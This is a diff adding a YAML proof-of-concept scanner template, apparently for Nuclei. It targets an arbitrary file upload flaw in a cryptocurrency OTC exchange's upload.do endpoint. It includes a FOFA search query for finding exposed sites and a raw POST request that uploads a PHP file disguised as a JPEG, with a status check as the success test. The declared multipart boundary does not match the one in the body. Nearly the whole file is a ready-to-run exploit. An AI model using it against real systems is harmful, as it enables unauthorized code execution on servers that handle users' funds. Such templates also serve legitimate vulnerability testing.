@@ -1,0 +1,69 @@
+id: poc-zi9e7anonpd6uiq6
+info:
+  name: 虚拟币买卖USDT场外交易所upload.do存在任意文件上传漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/zi9e7anonpd6uiq6'
+  tags: file-upload,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: zi9e7anonpd6uiq6
+    fofa: body="/static/weui/css/wkb.css"
+http:
+- raw:
+  - 'POST /member/index/upload.do HTTP/1.1
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+
+    Accept-Encoding: gzip, deflate, br, zstd
+
+    Accept-Language: zh-CN,zh;q=0.9,ru;q=0.8,en;q=0.7
+
+    Cache-Control: max-age=0
+
+    Connection: keep-alive
+
+    Content-Length: 197
+
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryZcxuMaQ4IflRnJgy
+
+    Cookie: Hm_lvt_f4b3788b2247dd149fb7fdffe8aece79=1717334200; _ga=GA1.1.64233863.1717334200; PHPSESSID=8t16e4ahe761qikg272s6jhsi0
+
+    Host: {{Hostname}}
+
+    Origin: [http://127.0.0.1:81](http://127.0.0.1:81)
+
+    Referer: [http://127.0.0.1:81/member/index/upload.do](http://127.0.0.1:81/member/index/upload.do)
+
+    Sec-Fetch-Dest: document
+
+    Sec-Fetch-Mode: navigate
+
+    Sec-Fetch-Site: none
+
+    Upgrade-Insecure-Requests: 1
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36
+
+    sec-ch-ua: "Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"
+
+    sec-ch-ua-mobile: ?0
+
+    sec-ch-ua-platform: "Windows"
+
+
+    ------WebKitFormBoundary03rNBzFMIytvpWhy
+
+    Content-Disposition: form-data; name="file"; filename="1.php"
+
+    Content-Type: image/jpeg
+
+
+    <?php phpinfo();?>
+
+    ------WebKitFormBoundary03rNBzFMIytvpWhy--'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
